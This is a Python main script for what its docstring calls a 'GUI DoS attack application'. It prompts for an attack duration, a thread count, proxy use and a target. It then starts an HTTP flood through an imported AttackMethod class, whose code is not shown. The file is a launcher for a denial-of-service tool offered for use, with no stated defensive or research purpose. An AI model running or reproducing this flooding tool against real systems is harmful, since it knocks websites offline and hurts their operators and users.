"""Main script to start GUI DoS attack application."""

# -*- coding: utf-8 -*-
import os
import sys

from colorama import Fore  # type: ignore[import]

os.chdir(os.path.dirname(os.path.realpath(__file__)))
os.system("cls" if os.name == "nt" else "clear")

try:
    from tools.addons.checks import check_number_input, check_proxy_input, check_target_input  # type: ignore[import]
    from tools.addons.logo import show_logo  # type: ignore[import]
    from tools.method import AttackMethod  # type: ignore[import]
except ImportError as err:
    from tools.crash import CriticalError  # type: ignore[import]

    CriticalError("Failed to import some packages", err)


def main() -> None:
    """Run main application."""
    show_logo()
    try:
        time = check_number_input("time")
        threads = check_number_input("threads")
        use_proxy = check_proxy_input()
        target = check_target_input()

        with AttackMethod(
            duration=time,
            method_name="HTTP",
            threads=threads,
            target=target,
            use_proxy=use_proxy,
        ) as attack:
            attack.start()
    except KeyboardInterrupt:
        print(
            f"\n{Fore.RED}[!] {Fore.MAGENTA}Ctrl+C detected. Program closed.{Fore.RESET}"
        )
        sys.exit(1)


if __name__ == "__main__":
    main()
